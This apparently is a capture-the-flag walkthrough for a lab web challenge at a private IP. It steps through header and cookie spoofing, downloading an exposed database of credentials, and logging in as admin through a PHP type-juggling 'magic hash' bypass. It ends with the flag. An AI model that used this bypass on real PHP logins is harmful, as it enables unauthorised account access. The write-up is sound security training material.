# Web

1. Address: `172.16.3.66`
2. Set Header: `Referer: https://google.com`
3. Set `User-Agent` To `WorldWideWeb`
4. Set Cookie `test_completed=true` in FireFox
5. Go To: `http://172.16.3.66/index.php`
6. Go To: `http://172.16.3.66/media`
7. Download DB `http://172.16.3.66/media/database.db` into [🗂 database.db](./database.db)
8. Open it and Get Username and Password

```text
Username: admin
Password: 0e745304954233478109486485467426
```

9. Type Juggling: `0e... == 0e...`, Sample: [🗂 TypeJuggling.php](./TupeJug.php)
10. Magic Hashes List for `Md5`: [🗂 Usefull TypeJuggling Hashes](https://github.com/spaze/hashes/blob/master/md5.md)
11. Login `admin`, `240610708`

```text
md5(X) = Starts With Number (0-9...)
md5(240610708) = 0e462097431906509019562988736854
```

12. Flag: `MAZAPA_7f90181e652faf6e9f3fb1532f290f89`
